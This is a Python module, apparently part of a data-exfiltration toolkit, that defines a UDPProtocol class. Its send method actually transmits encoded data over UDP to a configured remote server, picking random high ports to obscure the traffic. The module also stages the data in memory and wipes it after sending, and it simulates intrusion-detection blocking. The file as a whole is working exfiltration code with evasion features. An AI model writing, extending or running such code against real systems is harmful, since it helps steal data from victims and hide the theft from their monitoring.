from protocols.base_protocol import BaseProtocol
from security.memory_exfil import SecureMemoryExfiltrator
import socket
import random

class UDPProtocol(BaseProtocol):
    """
    Exfiltrates data using UDP packets.
    - Uses randomized packet sizes and port obfuscation.
    """

    def __init__(self, command, server_ip):
        super().__init__(name="UDP", detection_rate=0.1, command=command, server_ip=server_ip)
        self.memory_exfil = SecureMemoryExfiltrator()  # Initialize in-memory encrypted storage

    def send_udp_packet(self, encoded_data):
        """ Simulate UDP packet exfiltration. """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        port = random.randint(40000, 60000)  # Random port selection
        try:
            sock.sendto(encoded_data.encode(), (self.server_ip, port))
            return True
        except:
            return False

    def transmit(self, data):
        """ Transmit data via UDP-based exfiltration. """
        self.memory_exfil.store_data(data)  # Store in-memory
        encoded_data = self.encode_data(data)
        success = self.send_udp_packet(encoded_data)

        detected = random.random() < self.detection_rate  # Simulate IDS detection

        if detected:
            print(f"⚠️ UDP Exfiltration Blocked! Adjusting parameters...")
            return False
        
        self.memory_exfil.secure_wipe_memory()  # Wipe memory after transmission
        return success
